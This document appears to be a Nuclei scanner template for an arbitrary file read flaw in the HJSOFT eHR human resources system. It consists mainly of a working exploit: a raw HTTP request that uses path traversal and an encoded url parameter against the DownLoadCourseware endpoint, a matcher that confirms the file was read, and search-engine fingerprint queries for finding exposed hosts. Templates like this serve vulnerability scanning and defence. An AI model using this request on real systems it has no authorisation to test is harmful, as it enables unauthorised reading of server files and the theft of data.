id: HJSOFT-HCM_DownLoadCourseware_Fileread

info:
  name: HJSOFT-HCM_DownLoadCourseware_Fileread
  author: HK
  severity: medium
  description: 宏景eHR人力资源管理系统(ERP) /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware接口url参数存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/ThirdResource/respond/respond.min.js"
    Quaker-query: body="/ThirdResource/respond/respond.min.js"
    Hunter-query: body="/ThirdResource/respond/respond.min.js"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /w_selfservice/oauthservlet/%2e./.%2e/DownLoadCourseware?url=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Connection: close


  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - extensions